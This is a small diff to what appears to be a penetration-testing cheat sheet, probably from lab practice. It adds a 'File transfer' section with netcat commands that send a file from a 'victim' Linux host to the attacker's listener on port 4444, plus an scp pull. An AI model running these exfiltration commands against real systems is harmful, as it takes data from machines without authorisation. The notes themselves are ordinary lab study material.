@@ -689,6 +689,10 @@ zip2john sitebackup3.zip > zip.hash
 
 ## File transfer
 ```bash
+# Type this from linux's victim to my computer
+nc 192.168.45.176 4444 < local.txt
 
-
+# Type this from attacking machine
+scp stuart@192.168.234.144:/home/stuart/local.txt stuart_local.txt
+nc -nvlp 4444 > local.txt
 ```
